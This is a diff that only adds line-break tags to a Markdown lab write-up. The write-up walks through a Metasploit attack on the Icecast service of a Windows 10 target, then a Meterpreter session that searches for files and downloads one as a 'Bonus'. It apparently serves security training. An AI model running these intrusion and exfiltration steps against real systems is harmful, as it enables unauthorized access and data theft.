@@ -57,7 +57,7 @@ You've been provided full access to the network and are getting ping responses f
    - Run the command to use the Icecast module:
 
      > Answer:use 0
-![use-0](Images/4.Metasploit-Icecast-use-0.PNG)
+ <br/>![use-0](Images/4.Metasploit-Icecast-use-0.PNG)
 5. Set the `RHOST` to the target machine.
 
    - Run the command that sets the `RHOST`:
@@ -72,12 +72,12 @@ You've been provided full access to the network and are getting ping responses f
 ![run-exploit](Images/6.Run.PNG)
    - Run the command that performs a search for the `secretfile` textfile on the target.
      > Answer: search -f `*secretfile*`.txt
-![search-secretfile](Images/6.Search-result.PNG)
+<br/> ![search-secretfile](Images/6.Search-result.PNG)
 7. You should now have a Meterpreter session open.
 
     - Run the command to performs a search for the `recipe` textfile on the target:
       > Answer: search -f *recipe*.txt
-    ![Search-recipe](Images/7.Search-recipe.PNG)
+         <br/>![Search-recipe](Images/7.Search-recipe.PNG)
     - **Bonus**: Run the command that exfiltrates the `recipe` textfile:
       > Answer: download "c:\Users\IEUser\Documents\Drinks.recipe.txt"
 ![download-recipe](Images/7.Download-recipe.PNG)
@@ -103,13 +103,14 @@ run: use 991
 
 B. Open a Meterpreter shell and gather system information for the target.
 
-  > Answer: Computer name:    MSEDGEWIN10
-              OS:               Windows 10 (10.0 Build 17763)
-            Architecture:     x64
-            System Language:  en_US
-            Domain:           WORKGROUP
-            Logged On Users:  1
-            Metrepreter:      x86/windows
+  > Answer: 
+     <br/>       Computer name:    MSEDGEWIN10
+     <br/>       OS:               Windows 10 (10.0 Build 17763)
+     <br/>       Architecture:     x64
+    <br/>        System Language:  en_US
+     <br/>       Domain:           WORKGROUP
+     <br/>       Logged On Users:  1
+     <br/>       Metrepreter:      x86/windows
 
 C. Run the command that displays the target's computer system information:
 
